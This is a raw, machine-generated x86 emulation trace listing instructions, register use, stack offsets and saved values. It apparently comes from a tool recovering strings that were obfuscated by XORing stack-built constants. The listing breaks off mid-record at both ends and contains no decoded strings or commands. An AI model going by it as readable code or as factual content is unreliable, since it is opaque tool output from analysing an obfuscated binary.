0x10000 saving data to stack: 896093928 4 0x45d2a3: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d2a8: mov dword ptr [esp + 0xa8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d2af: mov dword ptr [esp + 0xac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45d2b6: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x80a0 for stack size 0x10000 0x45d2be: mov dword ptr [esp + 0x138], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x50 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45d2c5: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d2c7: mov dword ptr [esp + 0x13c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x50 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d2d5: mov dword ptr [esp + 0x134], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x50 and offset 0x8134 for stack size 0x10000 saving data to stack: 896093928 4 0x45d2dc: mov dword ptr [esp + 0x130], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x50 and offset 0x8130 for stack size 0x10000 saving data to stack: 914789047 4 0x45d2e7: pxor xmm1, xmmword ptr [esp + 0x130], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x50 and offset 0x8130 for stack size 0x10000 0x45d2f0: push eax, regs_read: [30, 19], regs_write: [30] 0x45d2f1: movaps xmmword ptr [esp + 0xa4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x54 and offset 0x80a4 for stack size 0x10000 saving data to stack: 1701667182 16 0x45d305: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d306: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45d30d: push dword ptr [esp + 0xe4], regs_read: [30], regs_write: [30] 0x45d31b: push dword ptr [esp + 0xe4], regs_read: [30], regs_write: [30] 0x45d327: movaps xmm1, xmmword ptr [esp + 0x140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x60 and offset 0x8140 for stack size 0x10000 0x45d336: mov dword ptr [esp + 0xb0], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1139471297 4 0x45d341: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d343: mov dword ptr [esp + 0xb4], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093837 4 0x45d34e: mov dword ptr [esp + 0xb8], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d359: mov dword ptr [esp + 0xbc], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x60 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45d364: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x60 and offset 0x80b0 for stack size 0x10000 0x45d36d: push eax, regs_read: [30, 19], regs_write: [30] 0x45d36e: movaps xmmword ptr [esp + 0xb4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x64 and offset 0x80b4 for stack size 0x10000 saving data to stack: 435761734006 16 0x45d384: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d389: mov dword ptr [esp + 0x150], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8150 for stack size 0x10000 saving data to stack: 914789047 4 0x45d394: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d399: mov dword ptr [esp + 0x158], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x8158 for stack size 0x10000 saving data to stack: 929680980 4 0x45d3a0: mov dword ptr [esp + 0x15c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x815c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d3a7: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45d3b5: mov dword ptr [esp + 0xc8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d3bc: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d3be: mov dword ptr [esp + 0x154], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8154 for stack size 0x10000 saving data to stack: 896093928 4 0x45d3c9: movaps xmm1, xmmword ptr [esp + 0x150], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x8150 for stack size 0x10000 0x45d3d1: mov dword ptr [esp + 0xc0], 0x43eaf3c1, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x80c0 for stack size 0x10000 saving data to stack: 1139471297 4 0x45d3dc: mov dword ptr [esp + 0xc4], 0x35694e8d, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093837 4 0x45d3e7: pxor xmm1, xmmword ptr [esp + 0xc0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x64 and offset 0x80c0 for stack size 0x10000 0x45d3f0: push eax, regs_read: [30, 19], regs_write: [30] 0x45d3f1: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x68 and offset 0x80c4 for stack size 0x10000 saving data to stack: 435761734006 16 0x45d405: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d406: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45d40d: push dword ptr [esp + 0xd4], regs_read: [30], regs_write: [30] 0x45d41b: push dword ptr [esp + 0xd4], regs_read: [30], regs_write: [30] 0x45d43d: mov dword ptr [esp + 0x10], 0x138fe192, regs_read: [30], regs_write: () adjusting stack for ESP -0x74 and offset 0x8010 for stack size 0x10000 saving data to stack: 328196498 4 0x45d455: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d45e: push eax, regs_read: [30, 19], regs_write: [30] 0x45d45f: mov dword ptr [esp + 0x1c], 0x3563439b, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x801c for stack size 0x10000 saving data to stack: 895697819 4 0x45d46b: mov dword ptr [esp + 0x20], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x8020 for stack size 0x10000 saving data to stack: 929680980 4 0x45d473: mov dword ptr [esp + 0x24], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0x7c and offset 0x8024 for stack size 0x10000 saving data to stack: 1389027477 4 0x45d47b: movaps xmm1, xmmword ptr [esp + 0x168], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x8168 for stack size 0x10000 0x45d483: pxor xmm1, xmmword ptr [esp + 0x18], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x7c and offset 0x8018 for stack size 0x10000 0x45d489: push eax, regs_read: [30, 19], regs_write: [30] 0x45d48a: push edi, regs_read: [30, 23], regs_write: [30] 0x45d48b: movaps xmmword ptr [esp + 0x20], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x84 and offset 0x8020 for stack size 0x10000 saving data to stack: 2829537960882981 16 0x45d4c3: push eax, regs_read: [30, 19], regs_write: [30] 0x45d4d8: push edi, regs_read: [30, 23], regs_write: [30] 0x45d4de: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d4df: mov edi, dword ptr [esp + 0xc], regs_read: [30], regs_write: [23] adjusting stack for ESP -0x88 and offset 0x800c for stack size 0x10000 0x45d4e3: mov byte ptr [esp + 0xb], 1, regs_read: [30], regs_write: () adjusting stack for ESP -0x88 and offset 0x800b for stack size 0x10000 saving data to stack: 1 1 0x45d4f1: mov eax, dword ptr [esp + 0x24], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x88 and offset 0x8024 for stack size 0x10000 0x45d518: push eax, regs_read: [30, 19], regs_write: [30] 0x45d533: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x8c and offset 0x8028 for stack size 0x10000 0x45d541: mov esi, 0x52cae095, regs_read: (), regs_write: [29] 0x45d556: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d563: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d564: mov dword ptr [esp + 0x10], 0x41e9d6eb, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8010 for stack size 0x10000 saving data to stack: 1105843947 4 0x45d570: mov dword ptr [esp + 0x14], 0x54062286, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8014 for stack size 0x10000 saving data to stack: 1409688198 4 0x45d57f: mov dword ptr [esp + 0x18], 0x3769bd30, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8018 for stack size 0x10000 saving data to stack: 929676592 4 0x45d587: mov edx, 0x4f05f0, regs_read: (), regs_write: [24] 0x45d58c: mov dword ptr [esp + 0x1c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8c and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d590: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x8c and offset 0x8010 for stack size 0x10000 0x45d595: mov dword ptr [esp + 0x40], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8040 for stack size 0x10000 saving data to stack: 914789047 4 0x45d59d: mov dword ptr [esp + 0x44], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x45d5a5: mov dword ptr [esp + 0x48], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x8c and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45d5ad: mov dword ptr [esp + 0x4c], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x8c and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d5b1: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x8c and offset 0x8040 for stack size 0x10000 0x45d5b7: push eax, regs_read: [30, 19], regs_write: [30] 0x45d5b8: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x90 and offset 0x8014 for stack size 0x10000 saving data to stack: 544923840886945954612316 16 0x45d5d1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d5da: push 0, regs_read: [30], regs_write: [30] 0x45d5dc: push eax, regs_read: [30, 19], regs_write: [30] 0x45d5eb: mov esi, 0x4f0810, regs_read: (), regs_write: [29] 0x45d5f0: mov byte ptr [esp + 0xb], 0, regs_read: [30], regs_write: () adjusting stack for ESP -0x94 and offset 0x800b for stack size 0x10000 saving data to stack: 0 1 0x45d5f5: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d611: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d618: mov eax, dword ptr [esp + 0x30], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x94 and offset 0x8030 for stack size 0x10000 0x45d61c: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45d61e: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x8024 for stack size 0x10000 saving data to stack: 621376293 4 0x45d62a: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x94 and offset 0x802c for stack size 0x10000 saving data to stack: 621376293 4 0x45d63a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d650: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d652: push eax, regs_read: [30, 19], regs_write: [30] 0x45d65f: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d661: push eax, regs_read: [30, 19], regs_write: [30] 0x45d67c: mov esi, eax, regs_read: [19], regs_write: [29] 0x45d687: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d68e: mov eax, dword ptr [esp + 0x38], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x9c and offset 0x8038 for stack size 0x10000 0x45d692: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x45d694: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x9c and offset 0x8028 for stack size 0x10000 saving data to stack: 621376293 4 0x45d6a3: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d6bb: mov dword ptr [esp + 0x10], 0x368692e8, regs_read: [30], regs_write: () adjusting stack for ESP -0x9c and offset 0x8010 for stack size 0x10000 saving data to stack: 914789096 4 0x45d6c3: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d6c8: mov dword ptr [esp + 0xc], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x9c and offset 0x800c for stack size 0x10000 saving data to stack: 896093928 4 0x45d6cc: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d6d1: mov dword ptr [esp + 0x18], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x9c and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x45d6d5: mov edi, 0x35694ee8, regs_read: (), regs_write: [23] 0x45d6da: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x9c and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d6de: mov dword ptr [esp + 0x14], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x9c and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x45d6e2: movaps xmm1, xmmword ptr [esp + 0x10], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x9c and offset 0x8010 for stack size 0x10000 0x45d6e7: mov dword ptr [esp + 0x48], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x9c and offset 0x8048 for stack size 0x10000 saving data to stack: 929680980 4 0x45d6f2: mov dword ptr [esp + 0x4c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x9c and offset 0x804c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d6f6: mov dword ptr [esp + 0x40], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x9c and offset 0x8040 for stack size 0x10000 saving data to stack: 914789047 4 0x45d6fe: mov dword ptr [esp + 0x44], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x9c and offset 0x8044 for stack size 0x10000 saving data to stack: 896093928 4 0x45d702: pxor xmm1, xmmword ptr [esp + 0x40], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x9c and offset 0x8040 for stack size 0x10000 0x45d708: push edx, regs_read: [30, 24], regs_write: [30] 0x45d70d: movaps xmmword ptr [esp + 0x14], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8014 for stack size 0x10000 saving data to stack: 95 16 0x45d717: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d724: push 0x4dc58b, regs_read: [30], regs_write: [30] 0x45d729: mov dword ptr [esp + 0x10], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8010 for stack size 0x10000 saving data to stack: 896093928 4 0x45d732: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45d737: mov dword ptr [esp + 0xa0], 0x3686f0c0, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80a0 for stack size 0x10000 saving data to stack: 914813120 4 0x45d742: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d747: mov dword ptr [esp + 0xa4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80a4 for stack size 0x10000 saving data to stack: 896093928 4 0x45d74e: mov edi, eax, regs_read: [19], regs_write: [23] 0x45d750: mov dword ptr [esp + 0xa8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80a8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d757: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d75c: mov dword ptr [esp + 0x174], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8174 for stack size 0x10000 saving data to stack: 896093928 4 0x45d763: mov dword ptr [esp + 0xac], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80ac for stack size 0x10000 saving data to stack: 1389027477 4 0x45d76a: movaps xmm1, xmmword ptr [esp + 0xa0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x80a0 for stack size 0x10000 0x45d772: mov dword ptr [esp + 0x178], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8178 for stack size 0x10000 saving data to stack: 929680980 4 0x45d779: mov dword ptr [esp + 0x17c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x817c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d780: mov dword ptr [esp + 0x170], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8170 for stack size 0x10000 saving data to stack: 914789047 4 0x45d78b: pxor xmm1, xmmword ptr [esp + 0x170], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x8170 for stack size 0x10000 0x45d794: movaps xmmword ptr [esp + 0xa0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80a0 for stack size 0x10000 saving data to stack: 25207 16 0x45d79c: mov dword ptr [esp + 0x164], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8164 for stack size 0x10000 saving data to stack: 896093928 4 0x45d7a3: mov dword ptr [esp + 0x168], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8168 for stack size 0x10000 saving data to stack: 929680980 4 0x45d7aa: mov dword ptr [esp + 0x16c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x816c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d7b1: mov dword ptr [esp + 0xb4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80b4 for stack size 0x10000 saving data to stack: 896093928 4 0x45d7b8: mov dword ptr [esp + 0xb8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80b8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d7bf: mov dword ptr [esp + 0xbc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80bc for stack size 0x10000 saving data to stack: 1389027477 4 0x45d7c6: mov dword ptr [esp + 0x160], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8160 for stack size 0x10000 saving data to stack: 914789047 4 0x45d7d1: movaps xmm1, xmmword ptr [esp + 0x160], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x8160 for stack size 0x10000 0x45d7d9: mov dword ptr [esp + 0xb0], 0x42fee699, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1124001433 4 0x45d7e4: pxor xmm1, xmmword ptr [esp + 0xb0], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x80b0 for stack size 0x10000 0x45d7ed: mov dword ptr [esp + 0xc4], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80c4 for stack size 0x10000 saving data to stack: 896093928 4 0x45d7f4: mov dword ptr [esp + 0xc8], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80c8 for stack size 0x10000 saving data to stack: 929680980 4 0x45d7fb: mov dword ptr [esp + 0xcc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80cc for stack size 0x10000 saving data to stack: 1389027477 4 0x45d802: movaps xmmword ptr [esp + 0xb0], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80b0 for stack size 0x10000 saving data to stack: 1954051118 16 0x45d80a: mov dword ptr [esp + 0xc0], 0x368692eb, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x80c0 for stack size 0x10000 saving data to stack: 914789099 4 0x45d815: movaps xmm1, xmmword ptr [esp + 0xc0], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x80c0 for stack size 0x10000 0x45d81d: mov dword ptr [esp + 0x154], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8154 for stack size 0x10000 saving data to stack: 896093928 4 0x45d82b: mov dword ptr [esp + 0x158], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8158 for stack size 0x10000 saving data to stack: 929680980 4 0x45d839: mov dword ptr [esp + 0x15c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xa0 and offset 0x815c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d847: mov dword ptr [esp + 0x150], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0xa0 and offset 0x8150 for stack size 0x10000 saving data to stack: 914789047 4 0x45d852: pxor xmm1, xmmword ptr [esp + 0x150], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xa0 and offset 0x8150 for stack size 0x10000 0x45d85b: push eax, regs_read: [30, 19], regs_write: [30] 0x45d85c: movaps xmmword ptr [esp + 0xc4], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xa4 and offset 0x80c4 for stack size 0x10000 saving data to stack: 92 16 0x45d869: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d86a: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x45d86e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45d875: push eax, regs_read: [30, 19], regs_write: [30] 0x45d882: push edi, regs_read: [30, 23], regs_write: [30] 0x45d88a: push eax, regs_read: [30, 19], regs_write: [30] 0x45d88b: push dword ptr [esp + 0x34], regs_read: [30], regs_write: [30] 0x45d8a2: push eax, regs_read: [30, 19], regs_write: [30] 0x45d8af: push eax, regs_read: [30, 19], regs_write: [30] 0x45d8da: push ecx, regs_read: [30, 22], regs_write: [30] 0x45d8db: push eax, regs_read: [30, 19], regs_write: [30] 0x45d8e1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d8e2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45d8ea: mov edi, eax, regs_read: [19], regs_write: [23] 0x45d915: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x800c for stack size 0x10000 0x45d927: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xbc and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x45d930: mov eax, dword ptr [esp + 0xc], regs_read: [30], regs_write: [19] adjusting stack for ESP -0xbc and offset 0x800c for stack size 0x10000 0x45d942: mov dword ptr [esp + 0xc], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xbc and offset 0x800c for stack size 0x10000 saving data to stack: 0 4 0x45d95a: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d95c: push eax, regs_read: [30, 19], regs_write: [30] 0x45d969: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45d96b: push eax, regs_read: [30, 19], regs_write: [30] 0x45d978: push eax, regs_read: [30, 19], regs_write: [30] 0x45d98d: mov esi, 0x368692b7, regs_read: (), regs_write: [29] 0x45d992: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45d997: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45d99c: mov dword ptr [esp + 0x140], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8140 for stack size 0x10000 saving data to stack: 914789047 4 0x45d9a3: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45d9a8: mov dword ptr [esp + 0x144], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8144 for stack size 0x10000 saving data to stack: 896093928 4 0x45d9af: mov dword ptr [esp + 0x148], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8148 for stack size 0x10000 saving data to stack: 929680980 4 0x45d9b6: mov dword ptr [esp + 0x14c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x814c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d9bd: mov dword ptr [esp + 0x120], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8120 for stack size 0x10000 saving data to stack: 914789047 4 0x45d9c4: mov dword ptr [esp + 0x124], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8124 for stack size 0x10000 saving data to stack: 896093928 4 0x45d9cb: mov dword ptr [esp + 0x128], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8128 for stack size 0x10000 saving data to stack: 929680980 4 0x45d9d2: mov dword ptr [esp + 0x12c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x812c for stack size 0x10000 saving data to stack: 1389027477 4 0x45d9d9: mov dword ptr [esp + 0x100], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8100 for stack size 0x10000 saving data to stack: 914789047 4 0x45d9e0: mov dword ptr [esp + 0x104], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8104 for stack size 0x10000 saving data to stack: 896093928 4 0x45d9e7: mov dword ptr [esp + 0x108], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xc8 and offset 0x8108 for stack size 0x10000 saving data to stack: 929680980 4 0x45d9ee: mov dword ptr [esp + 0x10c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xc8 and offset 0x810c for stack size 0x10000 saving data to stack: 1389027477 4 0x45da01: push 0x4dc58e, regs_read: [30], regs_write: [30] 0x45da0d: mov esi, eax, regs_read: [19], regs_write: [29] 0x45da14: push 0x4dc58f, regs_read: [30], regs_write: [30] 0x45da25: movaps xmm1, xmmword ptr [esp + 0x140], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd0 and offset 0x8140 for stack size 0x10000 0x45da34: mov dword ptr [esp + 0x90], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8090 for stack size 0x10000 saving data to stack: 921362626 4 0x45da3f: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45da41: mov dword ptr [esp + 0x94], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8094 for stack size 0x10000 saving data to stack: 896093928 4 0x45da4c: mov dword ptr [esp + 0x98], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x8098 for stack size 0x10000 saving data to stack: 929680980 4 0x45da57: mov dword ptr [esp + 0x9c], 0x52cae095, regs_read: [30], regs_write: () adjusting stack for ESP -0xd0 and offset 0x809c for stack size 0x10000 saving data to stack: 1389027477 4 0x45da62: pxor xmm1, xmmword ptr [esp + 0x90], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0xd0 and offset 0x8090 for stack size 0x10000 0x45da6b: push eax, regs_read: [30, 19], regs_write: [30] 0x45da6c: movaps xmmword ptr [esp + 0x94], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8094 for stack size 0x10000 saving data to stack: 137760366997177718415923828421988901058 16 0x45da82: mov edx, 0x35694ee8, regs_read: (), regs_write: [24] 0x45da87: mov dword ptr [esp + 0x80], 0x36eae0c2, regs_read: [30], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8080 for stack size 0x10000 saving data to stack: 921362626 4 0x45da92: mov ecx, 0x3769ce54, regs_read: (), regs_write: [22] 0x45da97: mov dword ptr [esp + 0x84], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8084 for stack size 0x10000 saving data to stack: 896093928 4 0x45da9e: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45daa3: mov dword ptr [esp + 0x88], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8088 for stack size 0x10000 saving data to stack: 929680980 4 0x45daaa: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xd4 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x45dab1: movaps xmm1, xmmword ptr [esp + 0x80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0xd4 and offset 0x8080 for stack size 0x10000 0x45dab9: mov dword ptr [esp + 0x138], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0xd4 and offset 0x8138 for stack size 0x10000 saving data to stack: 929680980 4 0x45dac0: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45dac2: mov dword ptr [esp + 0x13c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0xd4 and offset 0x813c for stack size 0x10000 saving data to stack: 1389027477 4 0x45dad0: mov dword ptr [esp + 0x134], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP 